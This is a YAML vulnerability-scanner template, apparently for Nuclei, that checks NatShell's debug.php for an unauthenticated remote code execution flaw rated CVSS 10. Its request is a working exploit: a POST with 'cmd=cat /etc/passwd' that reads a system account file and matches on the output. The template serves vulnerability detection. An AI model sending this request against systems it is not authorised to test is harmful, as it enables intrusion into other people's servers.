id: natshell-rce
info:
  name: NatShell Debug File - Remote Code Execution
  author: pikpikcu
  severity: critical
  description: This vulnerability allows for remote code execution through the vulnerability
    in the NatShell debug file.
  reference:
  - https://mp.weixin.qq.com/s/g4YNI6UBqIQcKL0TRkKWlw
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: natshell,rce
  metadata:
    impact: The discovered vulnerability in the NatShell debug file has the potential
      to cause significant impact through remote code execution.
    recommendation: It is recommended to update the NatShell debug file to prevent
      remote code execution.
requests:
- method: POST
  path:
  - '{{BaseURL}}/debug.php'
  body: 'cmd=cat /etc/passwd

    '
  matchers-condition: and
  matchers:
  - type: regex
    part: body
    regex:
    - toor:[x*]:0:0
  - type: status
    status:
    - 200
